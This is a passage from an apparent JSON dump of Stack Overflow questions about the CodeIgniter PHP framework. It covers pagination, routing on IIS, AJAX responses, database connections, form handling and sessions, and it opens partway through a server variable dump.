vrsession=8pO1KwOg4OPzCYqsJHX0Qr6FPfLteTimRjIKQPRC%2F83GlFRTepX%2FnrfE1yDxYxDXiPa2JcX4kQviV6lezxrXmJHjqVbWMe%2FgRne%2Bp9P4%2FfxlZrxta2Zl4DACs2C2nsp1SkqYj6k6xhP6Wc9Zlpxgsma752%2BGxHkvwnT6%2F%2FTey699wnV5je99kZe%2FIhSa04DZvoGXoFc6bx1%2B%2FZRtSvojD86ktpWK91AUFUvltcoj8%2F31jeX0h%2BR7VEOPMZLBeqJrcn7qZGeQ6N2XvCIsh6gqTRZIPdsvyAIW%2FTTibBiY0qUvh50yE5MH060D8utqsiv4S54UrXypBsCP3H2w66pLXHTQKKrK%2FAsn1SEWb2pew%2BEOE4prm%2BJKGxcAq0efCGhkpsHZoP9ZDKDekMzaJTIxUin99RUeXVZTF0yqsMD5A%2FFF0AdZuz343VWsJcV9zru4hPHaAky5NMoZa6R1be9PwA%3D%3D; __utma=74945813.1164249566.1347560100.1347560100.1347560100.1; __utmb=74945813.176.10.1347560100; __utmc=74945813; __utmz=74945813.1347560100.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)\n    [HTTP_HOST] =&gt; [redacted]\n    [HTTP_ORIGIN] =&gt; [redacted]\n    [HTTP_REFERER] =&gt; [redacted]/add\n    [HTTP_USER_AGENT] =&gt; Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\n    [PATH] =&gt; /bin:/usr/bin\n    [PHPRC] =&gt; [redacted]\n    [QUERY_STRING] =&gt; \n    [REDIRECT_QUERY_STRING] =&gt; /add\n    [REDIRECT_STATUS] =&gt; 200\n    [REDIRECT_UNIQUE_ID] =&gt; UFJZCUoyAC0AAE5v7ps\n    [REDIRECT_URL] =&gt; /add\n    [REMOTE_ADDR] =&gt; [redacted]\n    [REMOTE_PORT] =&gt; 48098\n    [REQUEST_METHOD] =&gt; POST\n    [REQUEST_URI] =&gt; /add\n    [SCRIPT_FILENAME] =&gt; [redacted]/index.php\n    [SCRIPT_NAME] =&gt; /index.php\n    [SERVER_ADDR] =&gt; [redacted]\n    [SERVER_ADMIN] =&gt; [redacted]\n    [SERVER_NAME] =&gt; [redacted]\n    [SERVER_PORT] =&gt; 80\n    [SERVER_PROTOCOL] =&gt; HTTP/1.1\n    [SERVER_SIGNATURE] =&gt; &lt;ADDRESS&gt;Apache/1.3.42 Server at [redacted] Port 80&lt;/ADDRESS&gt;\n\n    [SERVER_SOFTWARE] =&gt; Apache/1.3.42 (Unix) Sun-ONE-ASP/4.0.2 Resin/2.1.13 mod_fastcgi/2.4.6 mod_log_bytes/1.2 mod_bwlimited/1.4 mod_auth_passthrough/1.8 FrontPage/5.0.2.2635 mod_ssl/2.8.31 OpenSSL/0.9.7a\n    [UNIQUE_ID] =&gt; UFJZCUoyAC0AAE5v7ps\n    [PHP_SELF] =&gt; /index.php\n    [REQUEST_TIME] =&gt; 1347574025\n    [argv] =&gt; Array\n        (\n            [0] =&gt; /add\n        )\n\n    [argc] =&gt; 1\n)\n</code></pre>\n"},{"tags":["php","query","codeigniter","static","singleton"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1150,"score":0,"question_id":3065600,"title":"CodeIgniter static class question","body":"<p>If I would like to have several static methods in my models so I can say <code>User::get_registered_users()</code> and have it do something like</p>\n\n<pre><code>public static function get_registered_users()\n{\n    $sql = \"SELECT * FROM `users` WHERE `is_registered` = 0\";\n    $this-&gt;db-&gt;query($sql);\n    // etc...\n}\n</code></pre>\n\n<p>Is it possible to access the <code>$this-&gt;db</code> object or create a new one for a static method?</p>\n"},{"tags":["php","forms","codeigniter","multiple"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12407569,"title":"CodeIgniter - 2 forms in a view","body":"<p>I have a <strong>view</strong> which has 2 forms:</p>\n\n<pre><code>&lt;table&gt;\n&lt;th&gt;Write a comment.&lt;/th&gt;\n&lt;tr&gt;\n    &lt;td&gt;\n        &lt;?php echo form_open($this-&gt;uri-&gt;uri_string(),$form1); \n              echo form_textarea($comment);\n              echo form_submit('submit','submit');\n              echo form_close();\n        ?&gt;\n    &lt;/td&gt;\n&lt;/tr&gt; \n\n\n&lt;/table&gt;\n\n&lt;table&gt;\n    &lt;tr&gt;\n\n        &lt;td&gt;\n            &lt;?php echo form_open($this-&gt;uri-&gt;uri_string()); \n                  echo form_dropdown('portion', $portion_options); \n                  echo form_submit('book','book');\n                  echo form_close();\n            ?&gt;\n        &lt;/td&gt;\n    &lt;/tr&gt;\n&lt;/table&gt;\n</code></pre>\n\n<p>In the <strong>controller</strong> I check which button was clicked and then I perform some action by adding the corresponding form's values to the database. </p>\n\n<pre><code>if(isset($_POST['book']))\n{\n    //sending the data to the database\n    echo \"Book button clicked\";\n}\n\nif(isset($_POST['submit']))\n{\n   //sending the data to the database\n   echo \"Submit button clicked\";\n}\n</code></pre>\n\n<p>However when the 'book' button is clicked no action is performed. It is like the button was never clicked. Whereas when I click the 'submit' button, every action is done properly.</p>\n\n<p>In the past I have used the same technique on plain php (i mean no framework, just php), and has worked fine for me. Does codeigniter need any further configuration? Am I doing something wrong?</p>\n"},{"tags":["php","sql","query","codeigniter","chars"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12414691,"title":"Codeigniter like chars with diacritic?","body":"<p>Is possible to \"learn\" codeigniget to recognize chars like ľščťžýáíé or ĽŠČŤŽÝÁÍÉ ? Cause I want not to have search sensitive to those chars. For example if I have in my table row \"Šilíoá\" and I search for silioa nothing will be foung. But if I am searching for silioa it will be found. So I think that problem is in Š is it possible for example to learn codeigniter to recognize Š? Or Ž etc.?\nHere is my query:</p>\n\n<pre><code>$q = $this-&gt;db-&gt;query(\"SELECT * FROM (`knihy`) \n                  WHERE `stav` = 1 \n                  AND (Autor1 LIKE '$vyraz' \n                  OR Autor2 LIKE '$vyraz' \n                  OR Autor3 LIKE '$vyraz' \n                  OR Autor4 LIKE '$vyraz') \n                  ORDER BY `id` desc LIMIT $limit OFFSET $offset \");\n</code></pre>\n"},{"tags":["php","mvc","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":72,"score":2,"question_id":12413921,"title":"MVC, CodeIgniter , Using conitional statements in a view?","body":"<p>Does using conditional blocks in my view defeat the purpose of the MVC architecture?</p>\n\n<p>I have a controller method that loads a view and I want to have a different button group based on the page id that was passed as a paramater to that method.</p>\n\n<p>Everything works fine but in my view I have several:</p>\n\n<pre><code>&lt;?php if($pageID == n) : ?&gt;\n    html content...\n&lt;?php endif; ?&gt;\n</code></pre>\n\n<p>Is this a bad habit and if so what's a better solution? Calling a library method from my view seems wrong as well.</p>\n"},{"tags":["php","mysql","sql","query","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12414143,"title":"SQL Like is accepting only \"context\"","body":"<p>Hi I have problem in my DB Query.</p>\n\n<pre><code>$q = $this-&gt;db-&gt;query(\"SELECT * FROM (`knihy`) \n                      WHERE `stav` = 1 \n                      AND (Autor1 LIKE '$vyraz' \n                      OR Autor2 LIKE '$vyraz' \n                      OR Autor3 LIKE '$vyraz' \n                      OR Autor4 LIKE '$vyraz') \n                      ORDER BY `id` desc LIMIT $limit OFFSET $offset \");\n</code></pre>\n\n<p>The problem is that, when I am searching for example for \"lorem\" and I have in my table for example in row Autor1 content: \"lorem ipsum\" nothing will be found. But if I am searching for lorem ipsum there will be found those one field. Where is problem please?</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":12413160,"title":"How to show in CodeIgniter only the second parameter in form validation message?","body":"<p>E.g. I have this line in my language form_validation file:</p>\n\n<pre><code>$lang['min_length'] = \"%s must be at least %s characters in length.\";\n</code></pre>\n\n<p>And I want the output to be like this:</p>\n\n<pre><code>$lang['min_length'] = \"This field must be at least %s characters in length.\";\n</code></pre>\n\n<p>However, the problem is that it looks like this when echoed:</p>\n\n<p><strong>This field must be at least Your name characters in length.</strong></p>\n\n<p>which is wrong because it takes the first %s instead of the second %s.</p>\n\n<p>How can I force CI to take the second %s? Is it possible?</p>\n"},{"tags":["codeigniter","pagination"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":229,"score":1,"question_id":11114480,"title":"Codeigniter Pagination Need Solution - number link work but page doesnot display as appropriate","body":"<p>I have a problem with pagination in CodeIgniter 2.x\nThis is my code in Controller:</p>\n\n<pre><code>$config['base_url'] = base_url().'crawl/all/'.$file.'/';\n$config['total_rows'] = $total;\n$config['per_page'] = 10;\n$config['num_links'] = 3;\n$config['uri_segment'] = 4;\n$config['full_tag_open'] = '&lt;ul id=\"pagination\"&gt;';\n$config['full_tag_close'] = '&lt;/ul&gt;';\n$config['first_tag_open'] = '&lt;li&gt;';\n$config['first_tag_close'] = '&lt;/li&gt;';\n$config['last_tag_open'] = '&lt;li&gt;';\n$config['last_tag_close'] = '&lt;/li&gt;';\n$config['prev_tag_open'] = '&lt;li class=\"prev\"&gt;';\n$config['prev_tag_close'] = '&lt;/li&gt;';\n$config['next_tag_open'] = '&lt;li class=\"next\"&gt;';\n$config['next_tag_close'] = '&lt;/li&gt;';\n$config['cur_tag_open'] = '&lt;li class=\"active\"&gt;';\n$config['cur_tag_close'] = '&lt;/li&gt;';\n$config['num_tag_open'] = '&lt;li&gt;';\n$config['num_tag_close'] = '&lt;/li&gt;';\n\n$this-&gt;pagination-&gt;initialize($config);\n\n$data['total'] = $total;\n$data['path'] = $this-&gt;path.'/'.$file;\n$data['file'] = $file;\n$data['batch'] = $this-&gt;batch-&gt;all($file, $config['per_page'], $config['uri_segment']);\n</code></pre>\n\n<p>and my view is just: <code>&lt;?php echo $this-&gt;pagination-&gt;create_links() ?&gt;</code></p>\n\n<p>The links for pages numbers work (they move from 1 to 2 etc), but the data does not display correctly.</p>\n"},{"tags":["php","codeigniter","iis7","url-rewriting","iis-7.5"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":162,"score":0,"question_id":12374177,"title":"Codeigniter 1.7 on IIS 7.5","body":"<p>i wanna ask you for help related to deploy Codeigniter apps on IIS, version 7.5 . I've tried reading other posts here related to Codeigniter and IIS but none of them works. I developed an application with CodeIgniter 1.7 that works fine in Apache, but i can't make it work in IIS 7.5, under Windows 7 Ultimate.</p>\n\n<p><img src=\"http://i.stack.imgur.com/HZDp2.jpg\" alt=\"IIS data of phpconfig\"></p>\n\n<p>First of all, php already works in the server, and i followed al the steps to make it work, also i installed IIS_UrlRewriteModule that i suppose that is necessary for php applications to work and use files like htaccess. (Attached is a JPG of the phpinfo in the server). This is a local server IIS 7.5 .</p>\n\n<p>After that make sure that PHP works, i put the folder of the web application inside C:\\inetpub\\wwwroot\\ , and this is the .htaccess that i'm using in apache:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\n\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ /application/index.php?/$1 [L]\n\nRewriteCond %{REQUEST_URI} ^application.*\nRewriteRule ^(.*)$ /application/index.php?/$1 [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ application/index.php?/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n    # Submitted by: ElliotHaughin\n\n    ErrorDocument 404 index.php\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>And i read that with IIS you have to use web.config files, so i created a file based on an example of another post of stackoverflow and it has the next code:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration&gt;\n    &lt;system.webServer&gt;\n        &lt;rewrite&gt;\n            &lt;rules&gt;\n                &lt;rule name=\"MyRule\"&gt; &lt;match url=\"^(.*)$\" /&gt; \n                    &lt;conditions&gt;\n                        &lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsFile\" negate=\"true\" /&gt;\n                        &lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsDirectory\" negate=\"true\" /&gt;\n                    &lt;/conditions&gt;\n                    &lt;action type=\"Rewrite\" url=\"index.php/{R:1}\" appendQueryString=\"false\" /&gt;\n                &lt;/rule&gt;\n            &lt;/rules&gt;\n        &lt;/rewrite&gt;\n    &lt;/system.webServer&gt;\n&lt;/configuration&gt; \n</code></pre>\n\n<p>But, when i go to \"http:/ /localhost/application\" i get this:</p>\n\n<p><img src=\"http://i.stack.imgur.com/QK9ED.jpg\" alt=\"File directory of website\"></p>\n\n<p>And if i put \"http:/ /localhost/application/index.php\" i get error 500. I get the same situation if i only have web.config in the application root directory or if i have .htaccess in the root directory. I don't know whatelse to do, please help me.</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12411047,"title":"codeigniter - APPPATH returns path after controller","body":"<p>I've got problems with sorting out the paths in my app.</p>\n\n<p>I'm using APPPATH function to read/write my images's string path in my db. The problem is that the APPPATH puts the function after the controller</p>\n\n<p>here is my function for getting the css</p>\n\n<pre><code>&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"&lt;?php echo '../' . APPPATH.'_data/css/style.css'; ?&gt;\" /&gt;\n</code></pre>\n\n<p>and when i go to <code>http://localhost/project/index.php/home</code> it works great\ncss links to <code>http://localhost/project/application/_data/css/style.css</code> which is correct</p>\n\n<p>but then I have this other controller </p>\n\n<pre><code>http://localhost/project/index.php/member/index/1\n</code></pre>\n\n<p>The css file path has to be </p>\n\n<pre><code>href=\"&lt;?php echo '../../../' . APPPATH.\"_data/css/style.css\"; ?&gt;\"\n</code></pre>\n\n<p>because other wise my link to the css goes to </p>\n\n<pre><code>http://localhost/project/index.php/member/application/_data/css/style.css\n</code></pre>\n\n<p>I'm using a simple template structure where i have my header/content/footer in an include sub-folder in views and I'm sending data to the content. Pretty standard stuff. I just don't get why the APPPATH does not work as if when called it gives me the PATH to the APPLICATION folder regardless the class that's been used.</p>\n"},{"tags":["php","mysql","codeigniter","ssh","amazon-ec2"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":138,"score":2,"question_id":12410535,"title":"Connect to remote database (EC2 instance) using PHP/Codeigniter?","body":"<p>I've got <a href=\"http://getmnpp.org/\" rel=\"nofollow\">MNPP</a> (Nginx version of XAMPP) all set up on my Mac but can't figure how to connect to a database that isn't localhost. I've got a MySQL database on an EC2 instance that i'd like to connect to.</p>\n\n<p>I'm using Codeigniter/PHP and the following configuration works:</p>\n\n<pre><code>$db['default']['hostname'] = \"localhost\"; \n$db['default']['password'] = \"\";\n</code></pre>\n\n<p>and the following does <strong>NOT</strong> work:</p>\n\n<pre><code>$db['default']['hostname'] = \"mysite.com\"; //the name of my EC2 instance\n$db['default']['password'] = \"my_password\";\n</code></pre>\n\n<p>I can SSH into this EC2 database using a MySQL GUI, Sequel Pro, with the above configuration and my EC2 SSH key (<code>~/.ssh/mysite.pem</code>), I just can't do it programmatically from my PHP app on my localhost.</p>\n\n<p>Do I need to change anything in my my.cnf file or anywhere else to get this to work?</p>\n"},{"tags":["php","jquery","ajax","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12410084,"title":"AJAX script not returning success in codeigniter","body":"<p>JS:</p>\n\n<pre><code>$(function() {\n    load_custom_topics()\n//    load_main()\n});\n\nfunction load_custom_topics(){\n    $.ajax({\n    type: \"POST\",\n    async: false,\n    url: 'http://rickymason.net/thebump/index.php/ajax/load_custom_topics',\n    dataType: 'json', \n    data: { },\n        success: function(page){\n            alert(page);\n        }\n    });\n    event.preventDefault()\n}\n</code></pre>\n\n<p>load_custom_topics</p>\n\n<pre><code>public function load_custom_topics()\n{\n    $check = $this-&gt;page_model-&gt;check_active_topic();\n    if ($check == FALSE) \n    {\n            $page['content'] = 'TEST equals FALSE'; \n    } else {\n            $page['content'] = 'TRUE'; \n    }\n    echo json_encode($page);\n}\n</code></pre>\n\n<p>going to the page index.php/ajax/load_custom_topics returns this:</p>\n\n<p><code>{\"content\":\"TEST equals FALSE\"}</code></p>\n\n<p>The alert is not firing! Any idea why?</p>\n"},{"tags":["php","codeigniter","mongodb"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":515,"score":1,"question_id":7400644,"title":"Codeigniter and MongoDB","body":"<p>I am testing out PHP (Codeigniter) and Mongo (library by alexbilbie).\nI a new to MongoDB so I got a few starting questions.</p>\n\n<ol>\n<li><p>Is the library by Alex ready for production use? Can I use all mongodb features?</p></li>\n<li><p>Is Alex library the best for Mongodb to Codeigniter use?</p></li>\n<li><p>Do I have to use chained queries like this?</p>\n\n<p>$this->mongo_db->where(array('firstname' => 'Michael'))->get('users');</p></li>\n</ol>\n\n<p>I want each \"part\" on a separate row like this:</p>\n\n<pre><code>$this-&gt;mongo_db-&gt;select('*');\n$this-&gt;mongo_db-&gt;from('users');\n$this-&gt;mongo_db-&gt;where(array('firstname' =&gt; 'Michael'));\n\n$query = $this-&gt;db-&gt;get();\n</code></pre>\n\n<p>Thank you!</p>\n"},{"tags":["php","oop","codeigniter","continuous-integration"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12409546,"title":"Extending CI_Controller / Indirect modification of overloaded property","body":"<p>the CI community seems to have no answer to this (or maybe it is so obvious, that it looks like a noob question?), so I ask here.</p>\n\n<p>I've been seeing this kind of error for a long time now (error messages follow), however I have always used <a href=\"http://codeigniter.com/forums/viewthread/178540/#851803\" rel=\"nofollow\">this \"dirty\" workaround</a>. Now I do not want to edit the core CI code anymore, and I know there must be a graceful solution to this.</p>\n\n<p>Here is the setup.</p>\n\n<p>In my application/config/routes I have this</p>\n\n<pre><code>$route['default_controller'] = \"dispatcher\";\n</code></pre>\n\n<p>The Dispatcher class in application/controllers/ is defined as this:</p>\n\n<pre><code>class Dispatcher extends MY_Controller {\n\n function __construct() {\n  parent::__construct();\n  $this-&gt;load-&gt;helper(array('form','https'));\n }\n\n\n function index() {\n\n  # load models\n  $this-&gt;load-&gt;model('site/map');\n  $this-&gt;load-&gt;model('site/langs');\n  $this-&gt;load-&gt;model('site/pages');\n  if ( $mapped = $this-&gt;map-&gt;get_map() ){ // this is the line 21\n   $this-&gt;langs-&gt;set_user_lang( $this-&gt;GLO['show_lang_in_url'], $this-&gt;GLO['show_lang_at_home'] );\n   $red = base_url().$this-&gt;GLO['user_lang_label'].\"/\".$mapped;\n   redirect($red, \"refresh\");\n   } \n\n  ...\n</code></pre>\n\n<p>now MY_Controller resides in application/core and is defined as follows:</p>\n\n<pre><code>class MY_Controller extends CI_Controller {\n\n public function __construct() {\n        parent::__construct();\n  $this-&gt;GLO = array();   \n\n  #\n  # set defaults:\n  #\n  $this-&gt;GLO['deb'] = '';\n  $this-&gt;GLO['baseurl'] = base_url();\n  ... (more GLO[key] = value ) \n}\n\n public function __set ($key, $value ) {\n  $this-&gt;GLO[$key] = $value;\n }\n</code></pre>\n\n<p>Every model I use starts like this (named accordingly):</p>\n\n<pre><code>class Map extends CI_Model {\n\n function __construct(){\n  parent::__construct(); \n }\n\n function get_map(){\n        .....\n        return true;\n        }\n</code></pre>\n\n<p>Now with CI 2.1.2, PHP 5.3.3, Apache 2 on Debian when trying to load a page, I am getting this error:</p>\n\n<blockquote>\n  <p>A PHP Error was encountered Severity: Notice Message: Indirect\n  modification of overloaded property Langs::$GLO has no effect\n  Filename: site/langs.php Line Number: 82</p>\n  \n  <p>A PHP Error was encountered Severity: Notice Message: Undefined\n  property: Dispatcher::$map Filename: controllers/dispatcher.php Line\n  Number: 21</p>\n  \n  <p>Fatal error: Call to a member function get_map() on a non-object in\n  /home/webdev/MC/_WWW/application/controllers/dispatcher.php on line 21</p>\n</blockquote>\n\n<p>The line 21 is the one marked above in the Map model</p>\n\n<pre><code>if ( $mapped = $this-&gt;map-&gt;get_map() ){\n</code></pre>\n\n<p>the line 82 in the other model looks like this:</p>\n\n<pre><code>$this-&gt;GLO['langs'][] = $temp;\n</code></pre>\n\n<p>Throughout the code, this GLO array is referenced as $this-GLO[<em>key</em>]. It must be read and written from time to time. If I delete the __set function in MY_Controller, I get more of those warnings.</p>\n\n<p>Where is the problem?</p>\n\n<p>Thanks a lot in advance!</p>\n"},{"tags":["jquery","ajax","codeigniter","textarea"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":182,"score":3,"question_id":11623829,"title":"Disallowed Key Characters when doing an AJAX POST","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4197976/codeigniter-disallowed-key-characters\">CodeIgniter Disallowed Key Characters</a>  </p>\n</blockquote>\n\n\n\n<p>I'm using CodeIgniter and when I do a <code>POST</code> of a <code>&lt;textarea&gt;</code> using an AJAX call through jQuery, I get a <code>Disallowed Key Characters</code> error and I don't know why. Is there a solution to this?</p>\n"},{"tags":["php","javascript","jquery","jquery-ui","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12403354,"title":"Jquery UI Autocomplete not working","body":"<p>Im using Jquery widget Autocomplete.My data source  is a server-side script which returns JSON data.</p>\n\n<pre><code>$(function() {      \n    $( \"#supcode\" ).autocomplete({\n        source:\"index.php/inventory/supcode\",\n        minLength: 1                    \n    });\n});\n</code></pre>\n\n<p>Im using MVC architecture (Codeigniter) and using following method in controller to return the JSON data,</p>\n\n<pre><code>function supcode()\n{     \n    $dataarray=\"\";\n    $data=$this-&gt;Inventorymodel-&gt;supcode();\n    echo json_encode($data);\n}\n</code></pre>\n\n<p>And I am fetching the data in model using following function,</p>\n\n<pre><code>function supcode(){\n$finresult=\"\";\n$this-&gt;db-&gt;select('name');\n$query = $this-&gt;db-&gt;get('supplier');\n$result=$query-&gt;result_array();\n\nforeach($result as $row){\n    $finresult[]=array(\n        'name' =&gt; $row['name']\n    );\n}\nreturn $finresult;\n}\n</code></pre>\n\n<p>When I type a letter in the textbox filtering is not working and all the items are listed.What have I done wrong here? Can anyone help me? Thanks in advance....</p>\n"},{"tags":["php","codeigniter","ftp"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12409158,"title":"mysql_ping() error when transferring large files via FTP","body":"<p>I'm using Codeigniter for this. </p>\n\n<p>Basically it's a script that loops through file names in a database table, sending the files via FTP one by one. </p>\n\n<p>It works great for small files that are around 2-5mb, but I need it to send large video files that are almost 300mb. </p>\n\n<p>Currently it seems to sometimes work, sometimes not. The issue is that it actually transfers the file, but won't mark the item as sent after it has been sent, it just throws up this error: </p>\n\n<pre><code>mysql_ping() expects parameter 1 to be resource, boolean given\n</code></pre>\n\n<p>My understanding is that the connection to the database is lost, but I have several reconnect lines throughout the script to stop it from loosing connection:</p>\n\n<pre><code>$this-&gt;db-&gt;reconnect(); \n</code></pre>\n\n<p>It seems to work sometimes though, perhaps with servers that are faster than others it works, but when the file takes a while to transfer I get the mysql_ping() error. </p>\n\n<p>I have set script execution times to unlimited in the php.ini file already. </p>\n\n<p>Any help is most appreciated.</p>\n"},{"tags":["php","facebook","codeigniter","session-cookies","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":151,"score":0,"question_id":12393456,"title":"Integrating normal php session in codeigniter","body":"<p>I have been experiencing session in codeigniter but I have some failure since sometime I need to register session without using controller. For instance When a facebook user login in my app using FACEBOOK SDK this plugins use normal php session, so when I try to get them in codeigniter controller I fail; In other part when I register a session in a controller I will need to call the same session in other controllers or register base controller. Killing codeIgniter session does not remove SDK session and cookies. So How can I use normal session in CodeIgniter so that I don't loose SDK functionality. Thanks.</p>\n"},{"tags":["codeigniter","openid"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":0,"question_id":12131208,"title":"Social Authentification With CodeIgniter","body":"<p>I have a project where I'm supposed to integrate Facebook Login &amp; Twitter Login buttons using CodeIgniter , I was wondering what would be the best approach ? As this project requires more Social Login buttons in the future (like LinkedIn , Google , etc).</p>\n\n<p>I heared of OpenID &amp; JanRain.</p>\n\n<p>any Advice ?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":90,"score":0,"question_id":12333641,"title":"Codeigniter \"News section\" tutorial issue","body":"<p>I have a problem with the URI.\nI've tried to look through the post, but couldn't see the answer.</p>\n\n<p>Tutorial can be found here:\n<a href=\"http://codeigniter.com/user_guide/tutorial/news_section.html\" rel=\"nofollow\">http://codeigniter.com/user_guide/tutorial/news_section.html</a></p>\n\n<p>Basically I replicated all and it works fine, but there one think where I don't\nknow whether is my browser or I miss-configured something.</p>\n\n<p>In the \"views/news/index.php\" I have the following code as per tutorial:</p>\n\n\n\n<pre><code>&lt;h2&gt;&lt;? echo $news_item['title'] ?&gt;&lt;/h2&gt;\n&lt;div id=\"main\"&gt;\n    &lt;? echo $news_item['text']?&gt;\n&lt;/div&gt;\n&lt;p&gt;[b]&lt;a href=\"news/&lt;? echo $news_item['slug']?&gt;\"&gt;View Article&lt;/a&gt;[/b]&lt;/p&gt;\n</code></pre>\n\n\n\n<p>Now the problem is that when I look into the source html on my browser I see the link as:</p>\n\n<p>View Article</p>\n\n<p>Which I assume is correct.\nBut when I click on, it points me to:</p>\n\n<p>localhost/CI/index.php/news/news/firstnews</p>\n\n<p>As you can see the \"news\" is repeated twice in the URI.\nIt looks like the browser is simply appending the href value to the URI that is open,\ninstead of cleaning it down to index.php and add it there.</p>\n\n<p>I tried to remove the \"news\" bit from the href value and it works fine.</p>\n\n<p>I am using Chome if that makes any difference.</p>\n\n<p>Is that my misstake? Or this is just an error in the tutorial?</p>\n"},{"tags":["php","codeigniter","special-characters"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":105,"score":0,"question_id":11975455,"title":"Codeigniter : How to manage special character in multiple languages","body":"<p>I'm currently working in a bilingual application in CodeIgniter and I need to manage special characters like colon (:).</p>\n\n<p>In french, it's \" : \" (with spaces before and after) and in english, it's \":\" (no spaces).</p>\n\n<p>I thought about doing a label for the colon, like:</p>\n\n<pre><code>$lang['common.colon_separator'] = ' : ';\n</code></pre>\n\n<p>But in my view, it would be long to write something like this :</p>\n\n<pre><code>&lt;?=lang('common.image').lang('common.colon_separator')?&gt;\n</code></pre>\n\n<p>everytime that I need a colon.</p>\n\n<p>I already thought about a helper or maybe using the inflector helper.</p>\n\n<p>Is there anything else that I can do to manage this ? </p>\n\n<p>Thx</p>\n"},{"tags":["php","linux","apache",".htaccess","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12404721,"title":"VHost & htaccess - 500 Internal Server error","body":"<p>I use <strong>ISPConfig 3</strong> to manage my domains/subdomains.</p>\n\n<p>I added subdomain <code>parim.kristian.ee</code> which would redirect to <code>web/parim/</code> (<em>note: <strong>web/</strong> is my document root</em>).</p>\n\n<p>ISPConfig generated such redirect to apache config:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_HOST}   ^parim.kristian.ee [NC]\nRewriteRule   ^/(.*)$ /parim/$1  [L]\n</code></pre>\n\n<p>Now if i'll try to get static resources, such as <a href=\"http://parim.kristian.ee/images/1x1.gif\" rel=\"nofollow\">http://parim.kristian.ee/images/1x1.gif</a>, it serves fine, but when redirect is to codeigniter, it doesn't work.</p>\n\n<p>Htaccess in <code>web/parim/</code> looks like this:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine on\n\n    Options -Indexes\n\n    #Handle CodeIgniter request\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ ./index.php?/$1 [L] \n&lt;/IfModule&gt;\n&lt;IfModule !mod_rewrite.c&gt;\n    ErrorDocument 404 ./index.php\n&lt;/IfModule&gt;\n</code></pre>\n\n<p><strong>NOTE:</strong> accessing the same folder via <a href=\"http://kristian.ee/parim/\" rel=\"nofollow\">http://kristian.ee/parim/</a> works!</p>\n\n<p>I s*ck at htaccess, so any help is appreciated.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":12025103,"title":"PHP/Codeigniter - add multiple images anywhere inside a text","body":"<p>What i want to do is to create a add/edit articles with multiple images, like a blog.\nNow, lets say that in my add_article page/view i have a form with: an input type=\"text\", a textarea, 3 input type=\"file\" (for 3 different photos) and a submit button.</p>\n\n<p>Is there any way that i can insert those images anywhere i want inside the text?</p>\n"},{"tags":["php","oop","codeigniter","caching","browser"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12398714,"title":"cache issue with private networking stream","body":"<p>I am wondering if possible what might the most efficient way be to resolve the following cache problem:</p>\n\n<p>I recently finished a private networking stream a part of my CMF that utilizes the codeigniter framework. The problem is client browser cache. When User A responds to User B's post. User B isn't able to see the response unless their browser is refreshed. I do have a reload button present but obviously this isn't a 